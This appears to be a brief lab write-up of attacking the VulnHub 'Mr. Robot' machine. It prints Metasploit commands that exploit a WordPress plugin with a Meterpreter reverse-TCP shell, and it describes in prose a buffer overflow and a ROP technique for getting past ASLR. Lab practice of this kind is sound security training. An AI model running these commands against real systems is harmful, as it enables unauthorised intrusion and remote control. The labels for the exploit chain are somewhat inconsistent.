# Advanced Exploitation Lab

### Objective
Simulate real-world multi-stage attacks by chaining vulnerabilities and achieving remote code execution.

### Target Environment
- Target Machine: Mr. Robot (VulnHub)
- Target IP: `192.168.8.145`
- Attacker Machine: Kali Linux

### Tools Used
- Metasploit Framework
- Python
- Ghidra

### Exploit Chain
Exploited a vulnerable WordPress plugin leading to remote code execution using Metasploit.

```text
use exploit/multi/http/wordpress_plugin_rce
set RHOSTS 192.168.8.145
set PAYLOAD php/meterpreter/reverse_tcp
run
```
### Exploit Log
Exploit ID	Description	Target IP	Status	Payload
007	XSS to RCE Chain	192.168.8.145	Success	Meterpreter

### PoC

Modified a Python-based buffer overflow exploit from Exploit-DB by adjusting offset values and return addresses. Successfully achieved controlled EIP overwrite, leading to shell access. This enhanced understanding of stack behavior, memory corruption, and exploit reliability.

### Bypass Technique

Return-Oriented Programming (ROP) was used to bypass ASLR by chaining existing executable memory addresses. Carefully selected gadgets allowed controlled execution flow without injecting shellcode, demonstrating advanced exploitation against modern defense mechanisms.
